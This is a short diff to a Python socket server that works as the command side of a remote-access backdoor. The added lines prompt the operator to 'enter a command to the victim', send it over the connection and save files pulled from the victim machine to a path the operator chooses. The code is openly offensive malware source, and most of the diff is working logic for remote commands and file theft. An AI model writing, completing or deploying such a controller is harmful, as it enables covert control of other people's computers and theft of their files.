@@ -8,15 +8,15 @@ def server():
     s.listen(1)
     client_socket, adress = s.accept()
     print("Connection from: " + str(adress))
-    command = "get file C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\index.jpg"
-    # input('Please enter a command to the victim')
-    client_socket.send(command.encode('utf-8'))
 
     while True:
+        command = input('Please enter a command to the victim')
+        client_socket.send(command.encode('utf-8'))
         if 'get file ' in command:
             print('Get File')
             data = None
-            file_path = "C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\a.jpg"  # input("Please enter the path of the file")
+            file_path = input(
+                "Please enter the path of the file")
             with open(file_path, 'wb')as f:
                 print('Open File')
                 size = 0
@@ -31,11 +31,9 @@ def server():
                         f.close()
                         break
                     f.write(data)
-                    #f.flush()
-            print('yyyyyyyyyyyyyyyyyy')
-            command = ''
         else:
             data = client_socket.recv(1024)
+            print(data)
 
     client_socket.close()
 
